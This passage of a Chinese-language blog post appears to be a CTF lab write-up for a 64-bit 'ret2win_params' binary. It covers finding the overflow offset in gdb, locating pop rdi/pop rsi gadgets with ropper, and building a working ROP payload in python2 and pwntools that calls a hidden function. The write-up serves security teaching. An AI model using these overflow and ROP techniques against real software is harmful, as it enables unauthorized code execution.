class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line">0x0000000000401000  _init</span><br><span class="line">0x0000000000401030  puts@plt</span><br><span class="line">0x0000000000401040  printf@plt</span><br><span class="line">0x0000000000401050  __isoc99_scanf@plt</span><br><span class="line">0x0000000000401060  _start</span><br><span class="line">0x0000000000401090  _dl_relocate_static_pie</span><br><span class="line">0x00000000004010a0  deregister_tm_clones</span><br><span class="line">0x00000000004010d0  register_tm_clones</span><br><span class="line">0x0000000000401110  __do_global_dtors_aux</span><br><span class="line">0x0000000000401140  frame_dummy</span><br><span class="line">0x0000000000401142  hacked</span><br><span class="line">0x0000000000401190  register_name</span><br><span class="line">0x00000000004011d7  main</span><br><span class="line">0x00000000004011f0  __libc_csu_init</span><br><span class="line">0x0000000000401250  __libc_csu_fini</span><br><span class="line">0x0000000000401254  _fini</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gef➤  disassemble hacked </span><br><span class="line">Dump of assembler code for function hacked:</span><br><span class="line">   0x0000000000401142 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x0000000000401143 &lt;+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000401146 &lt;+4&gt;:	sub    rsp,0x10</span><br><span class="line">   0x000000000040114a &lt;+8&gt;:	mov    QWORD PTR [rbp-0x8],rdi</span><br><span class="line">   0x000000000040114e &lt;+12&gt;:	mov    QWORD PTR [rbp-0x10],rsi</span><br><span class="line">   0x0000000000401152 &lt;+16&gt;:	movabs rax,0xdeadbeefdeadbeef</span><br><span class="line">   0x000000000040115c &lt;+26&gt;:	cmp    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x0000000000401160 &lt;+30&gt;:	jne    0x401180 &lt;hacked+62&gt;</span><br><span class="line">   0x0000000000401162 &lt;+32&gt;:	movabs rax,0xc0debabec0debabe</span><br><span class="line">   0x000000000040116c &lt;+42&gt;:	cmp    QWORD PTR [rbp-0x10],rax</span><br><span class="line">   0x0000000000401170 &lt;+46&gt;:	jne    0x401180 &lt;hacked+62&gt;</span><br><span class="line">   0x0000000000401172 &lt;+48&gt;:	lea    rdi,[rip+0xe8f]        # 0x402008</span><br><span class="line">   0x0000000000401179 &lt;+55&gt;:	call   0x401030 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040117e &lt;+60&gt;:	jmp    0x40118d &lt;hacked+75&gt;</span><br><span class="line">   0x0000000000401180 &lt;+62&gt;:	lea    rdi,[rip+0xec1]        # 0x402048</span><br><span class="line">   0x0000000000401187 &lt;+69&gt;:	call   0x401030 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040118c &lt;+74&gt;:	nop</span><br><span class="line">   0x000000000040118d &lt;+75&gt;:	nop</span><br><span class="line">   0x000000000040118e &lt;+76&gt;:	leave</span><br><span class="line">   0x000000000040118f &lt;+77&gt;:	ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>跟32位不太一样</p>
+</blockquote>
+<ul>
+<li>输入命令<code>cyclic</code>就能获得测试用的字符串</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ cyclic 100</span><br><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>作用：生成100个字符串，每四个字符的最后一个字符都不一样，用于测试覆盖程序的返回地址需要多少个字符</p>
+</blockquote>
+<ul>
+<li>在<code>register_name</code>的<code>ret</code>指令前设置一个断点</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble register_name </span><br><span class="line">Dump of assembler code for function register_name:</span><br><span class="line">   0x0000000000401190 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x0000000000401191 &lt;+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000401194 &lt;+4&gt;:	sub    rsp,0x10</span><br><span class="line">   0x0000000000401198 &lt;+8&gt;:	lea    rdi,[rip+0xefa]        # 0x402099</span><br><span class="line">   0x000000000040119f &lt;+15&gt;:	call   0x401030 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004011a4 &lt;+20&gt;:	lea    rax,[rbp-0x10]</span><br><span class="line">   0x00000000004011a8 &lt;+24&gt;:	mov    rsi,rax</span><br><span class="line">   0x00000000004011ab &lt;+27&gt;:	lea    rdi,[rip+0xeed]        # 0x40209f</span><br><span class="line">   0x00000000004011b2 &lt;+34&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004011b7 &lt;+39&gt;:	call   0x401050 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x00000000004011bc &lt;+44&gt;:	lea    rax,[rbp-0x10]</span><br><span class="line">   0x00000000004011c0 &lt;+48&gt;:	mov    rsi,rax</span><br><span class="line">   0x00000000004011c3 &lt;+51&gt;:	lea    rdi,[rip+0xed8]        # 0x4020a2</span><br><span class="line">   0x00000000004011ca &lt;+58&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004011cf &lt;+63&gt;:	call   0x401040 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000004011d4 &lt;+68&gt;:	nop</span><br><span class="line">   0x00000000004011d5 &lt;+69&gt;:	leave</span><br><span class="line">   0x00000000004011d6 &lt;+70&gt;:	ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gef➤  b *0x4011d6</span><br><span class="line">Breakpoint 1 at 0x4011d6</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<ul>
+<li>运行</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">run</span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">$rax   : 0x6f              </span><br><span class="line">$rbx   : 0x00007fffffffd9c8  →  0x00007fffffffdd90  →  &quot;/home/xaut/Desktop/baimaoTutorial/crypto-cat-ctf/p[...]&quot;</span><br><span class="line">$rcx   : 0x0               </span><br><span class="line">$rdx   : 0x0               </span><br><span class="line">$rsp   : 0x00007fffffffd898  →  &quot;gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]&quot;</span><br><span class="line">$rbp   : 0x6161616661616165 (&quot;eaaafaaa&quot;?)</span><br><span class="line">$rsi   : 0x00000000004052a0  →  &quot;Hi there, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa[...]&quot;</span><br><span class="line">$rdi   : 0x00007fffffffd6a0  →  0x00007fffffffd6d0  →  &quot;Hi there, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa[...]&quot;</span><br><span class="line">$rip   : 0x00000000004011d6  →  &lt;register_name+0046&gt; ret </span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>e开头的寄存器都变成r开头的了，这也是64位程序的一个特征</p>
+<p>32位只有4个字节，而64位有8个字节</p>
+</blockquote>
+<ul>
+<li>检查栈顶内容</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/1gx $rsp</span><br><span class="line">0x7fffffffd898:	0x6161616861616167</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>x/1gx $rsp 命令表示从 rsp 指针所指向的地址开始，显示1个8字节（g 表示8字节）的内容<br>
+输出 0x7fffffffd898: 0x0000000000401200 表示栈顶的内容是 0x0000000000401200，这就是返回地址</p>
+</blockquote>
+<ul>
+<li>复制返回的地址去解码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ unhex 6161616861616167</span><br><span class="line">aaahaaag</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>注意:</p>
+<p>由于在x86架构里，读取地址是由低到高的，所以这里的字符串是gaaahaaa</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  cyclic -l gaaa</span><br><span class="line">24</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>说明要覆盖<code>rip</code>原本的返回地址并控制</p>
+<p>就需要24个字符+想让程序跳转执行的地址</p>
+</blockquote>
+<ul>
+<li>hacked函数的地址</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble hacked</span><br><span class="line">Dump of assembler code for function hacked:</span><br><span class="line">   0x0000000000401142 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x0000000000401143 &lt;+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000401146 &lt;+4&gt;:	sub    rsp,0x10</span><br><span class="line">   0x000000000040114a &lt;+8&gt;:	mov    QWORD PTR [rbp-0x8],rdi</span><br><span class="line">   0x000000000040114e &lt;+12&gt;:	mov    QWORD PTR [rbp-0x10],rsi</span><br><span class="line">   0x0000000000401152 &lt;+16&gt;:	movabs rax,0xdeadbeefdeadbeef</span><br><span class="line">   0x000000000040115c &lt;+26&gt;:	cmp    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x0000000000401160 &lt;+30&gt;:	jne    0x401180 &lt;hacked+62&gt;</span><br><span class="line">   0x0000000000401162 &lt;+32&gt;:	movabs rax,0xc0debabec0debabe</span><br><span class="line">   0x000000000040116c &lt;+42&gt;:	cmp    QWORD PTR [rbp-0x10],rax</span><br><span class="line">   0x0000000000401170 &lt;+46&gt;:	jne    0x401180 &lt;hacked+62&gt;</span><br><span class="line">   0x0000000000401172 &lt;+48&gt;:	lea    rdi,[rip+0xe8f]        # 0x402008</span><br><span class="line">   0x0000000000401179 &lt;+55&gt;:	call   0x401030 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040117e &lt;+60&gt;:	jmp    0x40118d &lt;hacked+75&gt;</span><br><span class="line">   0x0000000000401180 &lt;+62&gt;:	lea    rdi,[rip+0xec1]        # 0x402048</span><br><span class="line">   0x0000000000401187 &lt;+69&gt;:	call   0x401030 &lt;puts@plt&gt;</span><br><span class="line">   0x000000000040118c &lt;+74&gt;:	nop</span><br><span class="line">   0x000000000040118d &lt;+75&gt;:	nop</span><br><span class="line">   0x000000000040118e &lt;+76&gt;:	leave</span><br><span class="line">   0x000000000040118f &lt;+77&gt;:	ret</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401142</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>hacked函数的地址</p>
+<p>然后程序缓冲区的区间是24个字符</p>
+</blockquote>
+<h4 id="关于64位寄存器的知识点"><a class="header-anchor" href="#关于64位寄存器的知识点">¶</a>关于64位寄存器的知识点</h4>
+<ul>
+<li>64位程序将要对比的值存入<code>rdi</code>和<code>rsi</code>寄存器里</li>
+<li>在64位寄存器中有两个寄存器需要知道：<code>rdi</code>寄存器和<code>rsi</code>寄存器
+<ul>
+<li><code>rdi</code>寄存器用于第一个参数传递</li>
+<li><code>rsi</code>是第二个参数传递</li>
+<li>把对比的值放入这两个寄存器里，就需要参数传递</li>
+<li>64位比32位要麻烦许多</li>
+</ul>
+</li>
+</ul>
+<h4 id="构造ROP链"><a class="header-anchor" href="#构造ROP链">¶</a>构造ROP链</h4>
+<ul>
+<li>找到<code>rdi</code>寄存器和<code>rsi</code>寄存器等特殊的寄存器
+<ul>
+<li>需要<code>ropper</code>这个工具</li>
+<li>用处：<strong>寻找指定操作指令的地址</strong></li>
+</ul>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install ropper   # 安装ropper  </span><br><span class="line">ropper --file ret2win_params --search &quot;pop rdi&quot;  # 从内存中弹出值到rdi寄存器中</span><br></pre></td></tr></table></figure>
+<ul>
+<li>找到<code>pop rdi</code>指令的地址</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  ropper --file ret2win_params --search &quot;pop rdi&quot;</span><br><span class="line"></span><br><span class="line">[INFO] Load gadgets for section: LOAD</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[INFO] Load gadgets for section: GNU_STACK</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching for gadgets: pop rdi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[INFO] File: ret2win_params</span><br><span class="line">0x000000000040124b: pop rdi; ret; </span><br></pre></td></tr></table></figure>
+<ul>
+<li>执行<code>pop rdi</code>操作的地址</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x000000000040124b</span><br></pre></td></tr></table></figure>
+<ul>
+<li>继续补全我们的脚本<code>0xdeadbeefdeadbeef</code></li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &#x27;print &quot;A&quot; * 24 + &quot;\x4b\x12\x40\x00\x00\x00\x00\x00&quot; + &quot;\xef\xbe\xad\xde\xef\xbe\xad\xde&quot;&#x27;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>从内存中弹出并存放到rdi寄存器里的值</p>
+<p>就是需要对比的字符deadbeefdeadbeef</p>
+</blockquote>
+<ul>
+<li>找到<code>pop rsi</code>指令的地址</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ret2win_params --search &quot;pop rsi&quot;  </span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>从内存中弹出值到<code>rsi</code>寄存器中</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜ ropper --file ret2win_params --search &quot;pop rsi&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[INFO] Load gadgets from cache</span><br><span class="line">[LOAD] loading... 100%</span><br><span class="line">[LOAD] removing double gadgets... 100%</span><br><span class="line">[INFO] Searching for gadgets: pop rsi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[INFO] File: ret2win_params</span><br><span class="line">0x0000000000401249: pop rsi; pop r15; ret; </span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>但是由于这里还执行了其他的命令，pop r15；ret；</p>
+<p>可以传入一些垃圾字符进去</p>
+</blockquote>
+<ul>
+<li>执行<code>pop rsi</code>操作和几个其他命令的地址</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401249</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>继续补全脚本</p>
+<blockquote>
+<p>整个脚本的逻辑：</p>
+<p>垃圾字符 + pop_rdi的地址 + 我们第一个对比的值 + pop_rsi的地址 + 我们第二个对比的值 + 8个字符的垃圾数据 + hacked函数的地址</p>
+</blockquote>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 -c &#x27;print &quot;A&quot; * 24 + &quot;\x4b\x12\x40\x00\x00\x00\x00\x00&quot; + &quot;\xef\xbe\xad\xde\xef\xbe\xad\xde&quot; + &quot;\x49\x12\x40\x00\x00\x00\x00\x00&quot; + &quot;\xbe\xba\xde\xc0\xbe\xba\xde\xc0&quot; + &quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot; + &quot;\x42\x11\x40\x00\x00\x00\x00\x00&quot;&#x27; &gt; exp</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>hacked函数地址要在最后的原因是，</p>
+<p>如果我们放到第一个，程序跳转之后就不会执行我们后续的操作了，</p>
+<p>所以我们要将需要执行的操作都执行后，再跳转</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 对脚本的详细解释 （来自ai）</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 缓冲区溢出：</span></span><br><span class="line">	你通过输入<span class="number">24</span>个 A 来填充缓冲区，使其溢出并覆盖返回地址。</span><br><span class="line"><span class="comment"># 控制返回地址：</span></span><br><span class="line">	你使用 pop rdi 的地址（假设为 <span class="number">0x40124b</span>）来覆盖返回地址，使程序跳转到 pop rdi 指令。</span><br><span class="line"><span class="comment"># 设置 rdi 寄存器：</span></span><br><span class="line">	pop rdi 指令会从栈中弹出一个值并赋值给 rdi。你在这里提供了一个值 <span class="number">0xdeadbeefdeadbeef</span>，这个值将会被赋值给 rdi。</span><br><span class="line"><span class="comment"># 设置 rsi 寄存器：</span></span><br><span class="line">	你使用 pop rsi; pop r15; ret; 的地址（<span class="number">0x401249</span>）来覆盖 pop rdi 指令的返回地址，使程序跳转到 pop rsi; pop r15; ret; 指令。</span><br><span class="line">	pop rsi 指令会从栈中弹出一个值并赋值给 rsi。你在这里提供了一个值 <span class="number">0xc0debabec0debabe</span>，这个值将会被赋值给 rsi。</span><br><span class="line">	pop r15 指令会从栈中弹出一个值并赋值给 r15。为了不影响后续的操作，你在这里提供<span class="number">8</span>个垃圾字符（<span class="number">0x0000000000000000</span>）。</span><br><span class="line"><span class="comment"># 调用 hacked 函数：</span></span><br><span class="line">	最后，你使用 hacked 函数的地址（假设为 <span class="number">0x401142</span>）来覆盖 pop rsi; pop r15; ret; 指令的返回地址，使程序跳转到 hacked 函数。</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 为什么需要8个垃圾字符</span></span><br><span class="line">- pop r15; ret; 指令会从栈中弹出两个值：</span><br><span class="line">	- 第一个值赋值给 rsi。</span><br><span class="line">	- 第二个值赋值给 r15。</span><br><span class="line">- 为了不影响后续的操作，你需要提供一个<span class="number">8</span>字节的值来填充 r15。这个值可以是任意的，通常使用<span class="number">8</span>个零（<span class="number">0x0000000000000000</span>）作为垃圾字符。</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p>脚本调用<code>pop rdi</code>之类的指令，从内存弹出的值都是写入的值</p>
+<ul>
+<li>程序原本的值都被覆盖了，按照顺序弹</li>
+</ul>
+</li>
+<li>
+<p>在程序主函数的最后的地址下一个断点，方便调试，然后我们执行程序，并导入文件里的数据</p>
+</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disassemble register_name </span><br><span class="line">Dump of assembler code for function register_name:</span><br><span class="line">   0x0000000000401190 &lt;+0&gt;:	push   rbp</span><br><span class="line">   0x0000000000401191 &lt;+1&gt;:	mov    rbp,rsp</span><br><span class="line">   0x0000000000401194 &lt;+4&gt;:	sub    rsp,0x10</span><br><span class="line">   0x0000000000401198 &lt;+8&gt;:	lea    rdi,[rip+0xefa]        # 0x402099</span><br><span class="line">   0x000000000040119f &lt;+15&gt;:	call   0x401030 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004011a4 &lt;+20&gt;:	lea    rax,[rbp-0x10]</span><br><span class="line">   0x00000000004011a8 &lt;+24&gt;:	mov    rsi,rax</span><br><span class="line">   0x00000000004011ab &lt;+27&gt;:	lea    rdi,[rip+0xeed]        # 0x40209f</span><br><span class="line">   0x00000000004011b2 &lt;+34&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004011b7 &lt;+39&gt;:	call   0x401050 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x00000000004011bc &lt;+44&gt;:	lea    rax,[rbp-0x10]</span><br><span class="line">   0x00000000004011c0 &lt;+48&gt;:	mov    rsi,rax</span><br><span class="line">   0x00000000004011c3 &lt;+51&gt;:	lea    rdi,[rip+0xed8]        # 0x4020a2</span><br><span class="line">   0x00000000004011ca &lt;+58&gt;:	mov    eax,0x0</span><br><span class="line">   0x00000000004011cf &lt;+63&gt;:	call   0x401040 &lt;printf@plt&gt;</span><br><span class="line">   0x00000000004011d4 &lt;+68&gt;:	nop</span><br><span class="line">   0x00000000004011d5 &lt;+69&gt;:	leave</span><br><span class="line">   0x00000000004011d6 &lt;+70&gt;:	ret</span><br><span class="line">End of assembler dump.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gef➤  b *0x00000000004011d6</span><br><span class="line">Breakpoint 1 at 0x4011d6</span><br><span class="line"></span><br><span class="line">run &lt; exp</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line">●→   0x4011d6 &lt;register_name+0046&gt; ret    </span><br><span class="line">   ↳    0x40124b &lt;__libc_csu_init+005b&gt; pop    rdi ▷</span><br><span class="line">        0x40124c &lt;__libc_csu_init+005c&gt; ret    </span><br><span class="line">        0x40124d                  nop    DWORD PTR [rax]</span><br><span class="line">        0x401250 &lt;__libc_csu_fini+0000&gt; ret    </span><br><span class="line">        0x401251                  add    BYTE PTR [rax], al</span><br><span class="line">        0x401253                  add    BYTE PTR [rax-0x7d], cl</span><br><span class="line">        ......</span><br><span class="line">↳   	0x401249 &lt;__libc_csu_init+0059&gt; pop    rsi ▷</span><br><span class="line">        0x40124a &lt;__libc_csu_init+005a&gt; pop    r15</span><br><span class="line">        ......</span><br><span class="line">↳    	0x401142 &lt;hacked+0000&gt;    push   rbp  ▷</span><br><span class="line">    →   0x401143 &lt;hacked+0001&gt;    mov    rbp, rsp</span><br><span class="line">         0x401146 &lt;hacked+0004&gt;    sub    rsp, 0x10</span><br><span class="line">         0x40114a &lt;hacked+0008&gt;    mov    QWORD PTR [rbp-0x8], rdi  ▷</span><br><span class="line">         0x40114e &lt;hacked+000c&gt;    mov    QWORD PTR [rbp-0x10], rsi</span><br><span class="line">         0x401152 &lt;hacked+0010&gt;    movabs rax, 0xdeadbeefdeadbeef</span><br><span class="line">         0x40115c &lt;hacked+001a&gt;    cmp    QWORD PTR [rbp-0x8], rax  ▷</span><br></pre></td></tr></table></figure>
+<ul>
+<li>程序在执行了我们指定的操作后，才跳转到<code>hacked</code>函数的地址</li>
+<li>一直按<code>n</code>直到<code>call   0x401030 &lt;puts@plt&gt;</code>，成功破解程序</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">puts@plt (</span><br><span class="line">   $rdi = 0x0000000000402008 → &quot;This function is TOP SECRET! How did you get in he[...]&quot;,</span><br><span class="line">   $rsi = 0xc0debabec0debabe</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>直接执行程序+导入文件</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  64-bit git:(master) ✗ ./ret2win_params &lt; exp</span><br><span class="line">Name:</span><br><span class="line">Hi there, AAAAAAAAAAAAAAAAAAAAAAAAK@</span><br><span class="line">This function is TOP SECRET! How did you get in here?! :O</span><br><span class="line">[1]    7422 illegal hardware instruction (core dumped)  ./ret2win_params &lt; exp</span><br></pre></td></tr></table></figure>
+<h3 id="pwntools脚本-v4"><a class="header-anchor" href="#pwntools脚本-v4">¶</a>pwntools脚本</h3>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./ret2win_params&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&quot;A&quot;</span> * <span class="number">24</span> + <span class="string">b&quot;\x4b\x12\x40\x00\x00\x00\x00\x00&quot;</span> + <span class="string">b&quot;\xef\xbe\xad\xde\xef\xbe\xad\xde&quot;</span> + <span class="string">b&quot;\x49\x12\x40\x00\x00\x00\x00\x00&quot;</span> + <span class="string">b&quot;\xbe\xba\xde\xc0\xbe\xba\xde\xc0&quot;</span> + <span class="string">b&quot;\x00\x00\x00\x00\x00\x00\x00\x00&quot;</span> + <span class="string">b&quot;\x42\x11\x40\x00\x00\x00\x00\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.recvall())</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ➜  python3 exp.py</span><br><span class="line">[+] Starting local process &#x27;./ret2win_params&#x27;: pid 7682</span><br><span class="line">[+] Receiving all data: Done (102B)</span><br><span class="line">[*] Process &#x27;./ret2win_params&#x27; stopped with exit code -7 (SIGBUS) (pid 7682)</span><br><span class="line">b&#x27;Name:\nHi there, AAAAAAAAAAAAAAAAAAAAAAAAK\x12@\nThis function is TOP SECRET! How did you get in here?! :O\n&#x27;</span><br></pre></td></tr></table></figure>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        share
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
